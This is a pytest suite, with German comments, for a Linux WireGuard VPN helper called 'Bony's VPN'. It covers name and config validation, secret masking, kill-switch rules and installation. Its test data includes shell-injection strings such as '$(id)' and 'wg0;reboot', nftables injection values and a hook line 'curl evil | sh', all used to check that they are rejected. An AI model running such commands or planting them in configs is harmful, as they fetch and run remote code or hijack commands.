# SPDX-License-Identifier: GPL-3.0-or-later
"""Bony's VPN – ohne root, mit Attrappen für wg, wg-quick, nft, systemctl und pkexec."""
import ast
import base64
import io
import json
import os
import socket
import stat
import subprocess
import sys
import textwrap
import zipfile
from pathlib import Path

import pytest

if sys.platform != "linux":  # Bony's VPN läuft nur unter Linux (fcntl, pwd, wg-quick, nftables)
    pytest.skip("Bony's VPN gibt es nur unter Linux", allow_module_level=True)

from bonys_agents.vpn import cli, helper, install, killswitch  # noqa: E402
from bonys_agents.vpn import conf as wgconf  # noqa: E402

VPN_DIR = Path(helper.__file__).parent


def key(seed: int) -> str:
    return base64.b64encode(bytes([seed]) * 32).decode()


PRIV, PUB, PSK = key(1), key(2), key(3)


def make_conf(endpoint="vpn.example.net:51820", extra_iface="", extra_peer="") -> str:
    return textwrap.dedent(f"""\
        [Interface]
        PrivateKey = {PRIV}
        Address = 10.8.0.2/24, fd00::2/64
        DNS = 10.8.0.1
        {extra_iface}
        [Peer]
        PublicKey = {PUB}
        PresharedKey = {PSK}
        AllowedIPs = 0.0.0.0/0, ::/0
        Endpoint = {endpoint}
        PersistentKeepalive = 25
        {extra_peer}
        """)


# ---------- Attrappen ----------
FAKE_TOOLS = {
    "wg": """
        args = sys.argv[1:]
        active = state("active").split()
        if args == ["show", "interfaces"]:
            print(" ".join(active))
        elif len(args) == 3 and args[0] == "show":
            pub = "{pub}"
            if args[2] == "endpoints":
                print(pub + "\\t198.51.100.7:51820")
            elif args[2] == "latest-handshakes":
                print(pub + "\\t1700000000")
            elif args[2] == "transfer":
                print(pub + "\\t2048\\t1024")
        """,
    "wg-quick": """
        cmd, name = sys.argv[1], sys.argv[2]
        if name == "kaputt":
            sys.stderr.write("[#] wg setconf kaputt: Fehler bei Schlüssel {priv}\\n")
            sys.exit(1)
        active = [a for a in state("active").split() if a != name]
        if cmd == "up":
            active.append(name)
        write("active", " ".join(active))
        """,
    "nft": """
        args = sys.argv[1:]
        if args[:1] == ["-f"]:
            write("nft_rules", open(args[1]).read())
        elif args[:1] == ["list"]:
            sys.exit(0 if state("nft_rules") else 1)
        elif args[:1] == ["delete"]:
            write("nft_rules", "")
        """,
    "systemctl": """
        cmd, unit = sys.argv[1], sys.argv[2]
        enabled = state("enabled").split()
        if cmd == "is-enabled":
            print("enabled" if unit in enabled else "disabled")
            sys.exit(0 if unit in enabled else 1)
        if cmd == "enable":
            enabled.append(unit)
        if cmd == "disable":
            enabled = [u for u in enabled if u != unit]
        write("enabled", " ".join(enabled))
        """,
    "pkexec": """
        os.execv(sys.argv[1], sys.argv[1:])
        """,
}

PRELUDE = """#!{python}
import os, sys
STATE = {state!r}
def state(n):
    try:
        return open(os.path.join(STATE, n)).read()
    except OSError:
        return ""
def write(n, text):
    open(os.path.join(STATE, n), "w").write(text)
with open(os.path.join(STATE, "calls.log"), "a") as f:
    f.write(os.path.basename(sys.argv[0]) + " " + " ".join(sys.argv[1:]) + "\\n")
"""


@pytest.fixture
def env(tmp_path):
    fake_bin, fake_state = tmp_path / "bin", tmp_path / "state"
    fake_bin.mkdir()
    fake_state.mkdir()
    for name, body in FAKE_TOOLS.items():
        p = fake_bin / name
        p.write_text(PRELUDE.format(python=sys.executable, state=str(fake_state))
                     + textwrap.dedent(body).format(pub=PUB, priv=PRIV))
        p.chmod(0o755)

    def resolve(host, port, *a):
        if host == "vpn.example.net":
            return [(socket.AF_INET, socket.SOCK_DGRAM, 17, "", ("203.0.113.5", port))]
        raise socket.gaierror("nicht gefunden")

    h = helper.Helper(etc_wg=tmp_path / "wireguard", state_dir=tmp_path / "bonys-vpn", path=str(fake_bin),
                      as_root=False, resolve=resolve)
    h.fake_state = fake_state
    h.fake_bin = fake_bin
    h.calls = lambda: (fake_state / "calls.log").read_text() if (fake_state / "calls.log").exists() else ""
    return h


def run(h, *argv, data: bytes = b""):
    out = io.StringIO()
    err = io.StringIO()
    old = sys.stderr
    sys.stderr = err
    try:
        rc = helper.main(list(argv), helper=h, stdin=io.BytesIO(data), stdout=out)
    finally:
        sys.stderr = old
    return rc, out.getvalue(), err.getvalue()


# ---------- Namen ----------
@pytest.mark.parametrize("name", ["wg0", "fritz-box", "a.b_c=d+e", "x" * 15])
def test_valid_names(name):
    assert wgconf.check_name(name) == name


@pytest.mark.parametrize("name", ["", "../etc", "a/b", "wg0;reboot", "$(id)", "`id`", "mit leer", "x" * 16,
                                  "-h", "--help", ".", "..", "wg0\n", "tünnel", "a|b", "a&b", "~root"])
def test_invalid_names(name):
    with pytest.raises(wgconf.ConfError):
        wgconf.check_name(name)


@pytest.mark.parametrize("name", ["../passwd", "wg0;id", "$(reboot)", "a b", "-x"])
def test_injection_names_never_reach_a_program(env, name):
    for argv in (["up", name], ["delete", name], ["rename", "ok", name], ["autostart", name, "on"]):
        try:
            rc, _, err = run(env, *argv)
        except SystemExit as e:  # argparse lehnt „-x“ schon als Option ab
            rc, err = e.code, "Fehler: "
        assert rc != 0 and "Fehler" in err
    assert env.calls() == ""
    assert not (env.etc_wg / "passwd.conf").exists()


def test_unit_names_without_plus_or_equals():
    assert helper.wg_unit("fritz-box") == "wg-quick@fritz-box.service"
    with pytest.raises(helper.HelperError):
        helper.wg_unit("a+b")


# ---------- Konfiguration ----------
def test_parse_valid_conf_summary_has_no_secrets():
    c = wgconf.parse(make_conf())
    assert c.addresses == ["10.8.0.2/24", "fd00::2/64"]
    assert c.peers[0].endpoint == ("vpn.example.net", 51820)
    dump = json.dumps(c.summary())
    assert PRIV not in dump and PSK not in dump
    assert PUB in dump  # öffentlicher Schlüssel darf angezeigt werden


@pytest.mark.parametrize("endpoint,host", [("[2001:db8::1]:51820", "2001:db8::1"), ("192.0.2.1:1", "192.0.2.1"),
                                           ("abc.myfritz.net:58000", "abc.myfritz.net")])
def test_endpoints(endpoint, host):
    assert wgconf.parse(make_conf(endpoint=endpoint)).peers[0].endpoint[0] == host


@pytest.mark.parametrize("bad", [
    make_conf().replace(PRIV, PRIV[:-2] + "=="),            # 32 Byte? nein – falsche Länge/Format
    make_conf().replace(PRIV, "A" * 44),                    # kein „=“ am Ende
    make_conf().replace("10.8.0.2/24", "10.8.0.999/24"),
    make_conf(endpoint="vpn.example.net"),                  # ohne Port
    make_conf(endpoint="vpn.example.net:0"),
    make_conf(endpoint="999.1.1.1:51820"),
    make_conf(endpoint="host;reboot:51820"),
    make_conf(extra_iface="SaveConfig = true"),
    make_conf(extra_iface="Foo = bar"),
    make_conf(extra_iface=f"PrivateKey = {PRIV}"),          # doppelt
    make_conf() + "[Interface]\nPrivateKey = " + PRIV + "\n",
    make_conf().replace("[Peer]", "[Pier]"),
    make_conf().split("[Peer]")[0],                         # kein Peer
    make_conf().replace("AllowedIPs = 0.0.0.0/0, ::/0", ""),
    make_conf().replace("Address = 10.8.0.2/24, fd00::2/64", ""),
    "PrivateKey = " + PRIV + "\n" + make_conf(),            # vor dem ersten Abschnitt
    make_conf().replace("DNS = 10.8.0.1", "DNS = $(id)"),
])
def test_invalid_confs_are_rejected_without_showing_secrets(bad):
    with pytest.raises(wgconf.ConfError) as e:
        wgconf.parse(bad)
    assert PRIV not in str(e.value) and PSK not in str(e.value) and PRIV[:20] not in str(e.value)


def test_decode_rejects_binary_and_huge_and_strips_bom():
    with pytest.raises(wgconf.ConfError):
        wgconf.decode(b"[Interface]\x00\n")
    with pytest.raises(wgconf.ConfError):
        wgconf.decode(b"#" * (wgconf.MAX_SIZE + 1))
    with pytest.raises(wgconf.ConfError):
        wgconf.decode(b"\xff\xfe\x00")
    text = wgconf.decode(b"\xef\xbb\xbf" + make_conf().replace("\n", "\r\n").encode())
    assert "\r" not in text and text.startswith("[Interface]")
    wgconf.parse(text)


def test_hooks_are_detected():
    c = wgconf.parse(make_conf(extra_iface="PostUp = iptables -A x\nPreDown = echo hi"))
    assert c.hooks == ["PostUp", "PreDown"]


def test_mask_and_unmask():
    masked = wgconf.mask(make_conf())
    assert PRIV not in masked and PSK not in masked and masked.count(wgconf.HIDDEN) == 2
    assert wgconf.unmask(masked, make_conf()) == make_conf()
    with pytest.raises(wgconf.ConfError):
        wgconf.unmask(masked, "[Interface]\n")


# ---------- Helfer ----------
def test_import_writes_600_with_marker_and_no_temp_files(env):
    rc, out, err = run(env, "import", "fritz", data=make_conf().encode())
    assert rc == 0, err
    path = env.etc_wg / "fritz.conf"
    assert stat.S_IMODE(path.stat().st_mode) == 0o600
    assert stat.S_IMODE(env.etc_wg.stat().st_mode) == 0o700
    text = path.read_text()
    assert wgconf.is_managed(text) and PRIV in text
    assert [p.name for p in env.etc_wg.iterdir()] == ["fritz.conf"]
    assert PRIV not in out and PSK not in out
    # nochmal → abgelehnt, mit --replace erlaubt (verborgene Schlüssel bleiben die alten)
    assert run(env, "import", "fritz", data=make_conf().encode())[0] == 1
    rc, _, err = run(env, "import", "fritz", "--replace", data=wgconf.mask(make_conf()).encode())
    assert rc == 0, err
    assert PRIV in path.read_text() and wgconf.HIDDEN not in path.read_text()


def test_import_rejects_hooks_unless_allowed(env):
    data = make_conf(extra_iface="PostUp = curl evil | sh").encode()
    rc, _, err = run(env, "import", "hook", data=data)
    assert rc == 1 and "--allow-hooks" in err and "PostUp" in err
    assert not (env.etc_wg / "hook.conf").exists()
    assert run(env, "import", "hook", "--allow-hooks", data=data)[0] == 0


def test_import_rejects_invalid_conf(env):
    rc, _, err = run(env, "import", "x", data=b"[Interface]\nPrivateKey = kaputt\n")
    assert rc == 1 and "PrivateKey" in err and "kaputt" not in err
    assert not (env.etc_wg / "x.conf").exists()


def test_up_down_only_one_tunnel(env):
    for n in ("eins", "zwei"):
        assert run(env, "import", n, data=make_conf().encode())[0] == 0
    assert run(env, "up", "eins")[0] == 0
    assert run(env, "up", "zwei")[0] == 0
    assert env.active() == ["zwei"]
    assert "wg-quick down eins" in env.calls()
    assert run(env, "down")[0] == 0
    assert env.active() == []


def test_up_unknown_tunnel(env):
    rc, _, err = run(env, "up", "gibtsnicht")
    assert rc == 1 and "gibt es nicht" in err


def test_tool_errors_are_scrubbed(env):
    assert run(env, "import", "kaputt", data=make_conf().encode())[0] == 0
    rc, out, err = run(env, "up", "kaputt")
    assert rc == 1 and "fehlgeschlagen" in err
    assert PRIV not in err and wgconf.HIDDEN in err


def test_status_json_and_no_secrets_anywhere(env):
    run(env, "import", "fritz", data=make_conf().encode())
    run(env, "up", "fritz")
    outputs = []
    for argv in (["list"], ["status"], ["status", "fritz"], ["show", "fritz"], ["killswitch", "status"]):
        rc, out, err = run(env, *argv)
        assert rc == 0, err
        outputs.append(out + err)
    status = json.loads(outputs[1])
    t = status["tunnels"][0]
    assert status["active"] == "fritz"
    assert t["active"] and t["handshake"] == 1700000000 and t["rx"] == 2048 and t["tx"] == 1024
    assert t["peers"][0]["endpoint"] == "vpn.example.net:51820"
    assert status["killswitch"] == {"enabled": False, "active": False, "exceptions": []}
    assert json.loads(outputs[3])["conf"].count(wgconf.HIDDEN) == 2
    for text in outputs:
        assert PRIV not in text and PSK not in text
    # der Helfer fragt nie „wg show … dump“ ab (enthält private Schlüssel)
    assert " dump" not in env.calls()


def test_export_contains_key_but_no_marker(env):
    run(env, "import", "fritz", data=make_conf().encode())
    rc, out, _ = run(env, "export", "fritz")
    assert rc == 0 and out == make_conf().rstrip("\n") + "\n" and wgconf.MARKER not in out


def test_foreign_tunnels_cannot_be_changed(env):
    env.etc_wg.mkdir(mode=0o700)
    (env.etc_wg / "fremd.conf").write_text(make_conf())
    for argv in (["delete", "fremd"], ["export", "fremd"], ["rename", "fremd", "neu"]):
        rc, _, err = run(env, *argv)
        assert rc == 1 and "nicht mit Bony's VPN angelegt" in err
    assert (env.etc_wg / "fremd.conf").exists()
    assert json.loads(run(env, "list")[1])["tunnels"][0]["managed"] is False


def test_rename_and_delete_with_autostart(env):
    run(env, "import", "alt", data=make_conf().encode())
    assert run(env, "autostart", "alt", "on")[0] == 0
    assert run(env, "rename", "alt", "neu")[0] == 0
    assert (env.etc_wg / "neu.conf").exists() and not (env.etc_wg / "alt.conf").exists()
    assert (env.fake_state / "enabled").read_text().split() == ["wg-quick@neu.service"]
    run(env, "up", "neu")
    assert run(env, "rename", "neu", "x")[0] == 1  # verbunden → erst trennen
    assert run(env, "delete", "neu")[0] == 0
    assert not (env.etc_wg / "neu.conf").exists()
    assert env.active() == [] and (env.fake_state / "enabled").read_text().split() == []


def test_autostart_only_one(env):
    for n in ("eins", "zwei"):
        run(env, "import", n, data=make_conf().encode())
    run(env, "autostart", "eins", "on")
    run(env, "autostart", "zwei", "on")
    assert (env.fake_state / "enabled").read_text().split() == ["wg-quick@zwei.service"]


def test_symlinked_conf_is_ignored(env, tmp_path):
    env.etc_wg.mkdir(mode=0o700)
    (tmp_path / "geheim").write_text(make_conf())
    (env.etc_wg / "link.conf").symlink_to(tmp_path / "geheim")
    assert env.names() == []
    assert run(env, "export", "link")[0] == 1


# ---------- Kill-Switch ----------
def test_ruleset_text():
    rules = killswitch.ruleset(["fritz"], [("203.0.113.5", 51820), ("2001:db8::1", 4500)], ["10.0.2.0/24"], [0, 991])
    assert rules.splitlines()[1:4] == ["table inet bonys_vpn", "delete table inet bonys_vpn",
                                       "table inet bonys_vpn {"]
    for line in ('oifname "lo" accept', 'oifname { "fritz" } accept', "ct direction reply accept",
                 "udp sport 68 udp dport 67 accept", "ip daddr 203.0.113.5 udp dport 51820 accept",
                 "ip6 daddr 2001:db8::1 udp dport 4500 accept", "meta skuid 991 udp dport 53 accept",
                 "ip daddr 10.0.2.0/24 accept", "type filter hook output priority filter; policy drop;"):
        assert line in rules
    assert rules.rstrip().splitlines()[-3].strip() == "reject with icmpx admin-prohibited"


def test_ruleset_rejects_garbage():
    with pytest.raises(ValueError):
        killswitch.ruleset([], [("1.2.3.4; flush ruleset", 1)], [])
    with pytest.raises(ValueError):
        killswitch.ruleset([], [], ["10.0.2.0/24 accept; flush ruleset"])


def test_killswitch_on_off(env):
    run(env, "import", "fritz", data=make_conf().encode())
    run(env, "import", "ip6", data=make_conf(endpoint="[2001:db8::1]:51820").encode())
    run(env, "import", "weg", data=make_conf(endpoint="unbekannt.example:51820").encode())
    rc, out, err = run(env, "killswitch", "on", "--exception", "10.0.2.0/24")
    assert rc == 0, err
    assert json.loads(out) == {"enabled": True, "active": True, "exceptions": ["10.0.2.0/24"]}
    assert "unbekannt.example" in err  # Hinweis, kein Abbruch
    rules = (env.fake_state / "nft_rules").read_text()
    assert "ip daddr 203.0.113.5 udp dport 51820 accept" in rules
    assert "ip6 daddr 2001:db8::1 udp dport 51820 accept" in rules
    assert 'oifname { "fritz", "ip6", "weg" } accept' in rules
    assert PRIV not in rules
    assert "bonys-vpn-killswitch.service" in (env.fake_state / "enabled").read_text()
    # Neuer Tunnel → Regeln werden erneuert
    run(env, "import", "neu", data=make_conf(endpoint="192.0.2.9:4500").encode())
    assert "ip daddr 192.0.2.9 udp dport 4500 accept" in (env.fake_state / "nft_rules").read_text()
    assert run(env, "killswitch", "on", "--exception", "kein netz")[0] == 1
    rc, out, _ = run(env, "killswitch", "off")
    assert json.loads(out)["enabled"] is False and json.loads(out)["active"] is False
    assert not (env.state_dir / "killswitch.nft").exists()
    assert "bonys-vpn-killswitch.service" not in (env.fake_state / "enabled").read_text()


def test_killswitch_keeps_last_known_endpoint(env):
    run(env, "import", "fritz", data=make_conf().encode())
    run(env, "killswitch", "on")
    env.resolve = lambda *a: (_ for _ in ()).throw(socket.gaierror("offline"))
    rc, _, err = run(env, "up", "fritz")
    assert rc == 0 and "zuletzt bekannte Adresse" in err
    assert "ip daddr 203.0.113.5 udp dport 51820 accept" in (env.fake_state / "nft_rules").read_text()


# ---------- Kommandozeile ----------
@pytest.fixture
def cli_env(env, tmp_path, monkeypatch):
    script = tmp_path / "fake-helper"
    script.write_text(textwrap.dedent(f"""\
        #!{sys.executable}
        import socket, sys
        sys.path.insert(0, {str(Path(helper.__file__).parents[2])!r})
        from bonys_agents.vpn import helper
        def resolve(host, port, *a):
            return [(socket.AF_INET, socket.SOCK_DGRAM, 17, "", ("203.0.113.5", port))]
        h = helper.Helper(etc_wg={str(env.etc_wg)!r}, state_dir={str(env.state_dir)!r},
                          path={str(env.fake_bin)!r}, as_root=False, resolve=resolve)
        sys.exit(helper.main(helper=h))
        """))
    script.chmod(0o755)
    monkeypatch.setenv("BONYS_VPN_HELPER", str(script))
    monkeypatch.setenv("PATH", f"{env.fake_bin}:{os.environ['PATH']}")
    monkeypatch.setattr(os, "geteuid", lambda: 1000)
    return env


def test_cli_import_status_export(cli_env, tmp_path, capsys):
    src = tmp_path / "Fritz Box.conf"
    src.write_text(make_conf())
    assert cli.main(["import", str(src)]) == 1  # Name aus Dateiname ungültig (Leerzeichen)
    assert "--name" in capsys.readouterr().err
    assert cli.main(["import", str(src), "--name", "fritz"]) == 0
    assert cli.main(["up", "fritz"]) == 0
    assert cli.main(["status"]) == 0
    out = capsys.readouterr().out
    assert "fritz: verbunden" in out and "2,0 KiB empfangen" in out and PRIV not in out
    target = tmp_path / "export.conf"
    assert cli.main(["export", "fritz", str(target)]) == 0
    assert stat.S_IMODE(target.stat().st_mode) == 0o600 and PRIV in target.read_text()
    assert cli.main(["export", "fritz", str(target)]) == 1  # nicht überschreiben
    assert "pkexec" in cli_env.calls()


def test_cli_import_zip_and_hooks(cli_env, tmp_path, capsys):
    z = tmp_path / "tunnel.zip"
    with zipfile.ZipFile(z, "w") as f:
        f.writestr("ordner/eins.conf", make_conf())
        f.writestr("zwei.conf", make_conf(extra_iface="PostUp = echo hi"))
        f.writestr("liesmich.txt", "nix")
    assert cli.main(["import", str(z)]) == 1
    err = capsys.readouterr().err
    assert "zwei" in err and "PostUp" in err
    assert cli.main(["import", str(z), "--hooks-erlauben", "--ersetzen"]) == 0
    assert sorted(p.name for p in cli_env.etc_wg.iterdir()) == ["eins.conf", "zwei.conf"]


def test_cli_killswitch_and_delete(cli_env, capsys):
    cli_env.import_conf("fritz", make_conf().encode())
    assert cli.main(["killswitch", "an", "--ausnahme", "10.0.2.0/24"]) == 0
    assert "Kill-Switch: an – Ausnahmen: 10.0.2.0/24" in capsys.readouterr().out
    assert cli.main(["delete", "fritz", "--ja"]) == 0
    assert not (cli_env.etc_wg / "fritz.conf").exists()


def test_cli_human_formats():
    assert cli.human_bytes(512) == "512 B"
    assert cli.human_bytes(3 * 1024 * 1024) == "3,0 MiB"
    assert cli.human_age(None) == "noch keiner"
    assert cli.human_age(100, now=190) == "vor 1 min"


# ---------- Installation und Eigenständigkeit ----------
def test_install_into_root(tmp_path):
    written = install.install("agent", "agent", tmp_path, as_root=False)
    helper_file = tmp_path / install.HELPER
    assert helper_file in written and os.access(helper_file, os.X_OK)
    assert helper_file.read_text().startswith("#!/usr/bin/python3 -I")
    policy = (tmp_path / install.POLICY).read_text()
    assert "<annotate key=\"org.freedesktop.policykit.exec.path\">/usr/local/sbin/bonys-vpn-helper<" in policy
    assert "auth_admin_keep" in policy
    rules = (tmp_path / install.RULES).read_text()
    assert 'subject.user == "agent"' in rules and "polkit.Result.YES" in rules
    cfg = json.loads((tmp_path / install.STATE_DIR / "killswitch.json").read_text())
    assert cfg == {"enabled": False, "exceptions": ["10.0.2.0/24"]}
    assert stat.S_IMODE((tmp_path / "etc/wireguard").stat().st_mode) == 0o700
    for m in install.MODULES:
        assert (tmp_path / install.LIB_DIR / install.PKG / m).exists()
    # Host: andere Regel, keine Ausnahmen; vorhandene Kill-Switch-Einstellung bleibt
    host_root = tmp_path / "host"
    install.install("host", root=host_root, as_root=False)
    assert "AUTH_ADMIN_KEEP" in (host_root / install.RULES).read_text()
    assert json.loads((host_root / install.STATE_DIR / "killswitch.json").read_text())["exceptions"] == []
    with pytest.raises(ValueError):
        install.install("agent", 'agent"; evil', tmp_path, as_root=False)
    install.uninstall(tmp_path)
    assert not helper_file.exists() and not (tmp_path / install.LIB_DIR).exists()


def test_installed_copy_runs_standalone(tmp_path):
    """Die kopierten Dateien laufen ohne Bony's Agents (eigener Paketname, nur Standardbibliothek)."""
    install.install("agent", "agent", tmp_path, as_root=False)
    lib = tmp_path / install.LIB_DIR
    proc = subprocess.run([sys.executable, "-I", "-c",
                           f"import sys; sys.path.insert(0, {str(lib)!r}); "
                           "from bonys_vpn import conf, cli, helper; print(conf.check_name('wg0'))"],
                          capture_output=True, text=True)
    assert proc.returncode == 0, proc.stderr
    assert proc.stdout.strip() == "wg0"


def test_vpn_package_has_no_project_imports():
    stdlib = set(sys.stdlib_module_names)
    for py in VPN_DIR.glob("*.py"):
        tree = ast.parse(py.read_text())
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                mods = [a.name.split(".")[0] for a in node.names]
            elif isinstance(node, ast.ImportFrom):
                if node.level:  # relativ – im eigenen Paket
                    continue
                mods = [(node.module or "").split(".")[0]]
            else:
                continue
            for m in mods:
                assert m in stdlib or m == "__future__", f"{py.name} importiert {m}"


def test_helper_never_uses_shell():
    src = "".join(p.read_text() for p in VPN_DIR.glob("*.py"))
    assert "shell=True" not in src and "os.system" not in src and "os.popen" not in src
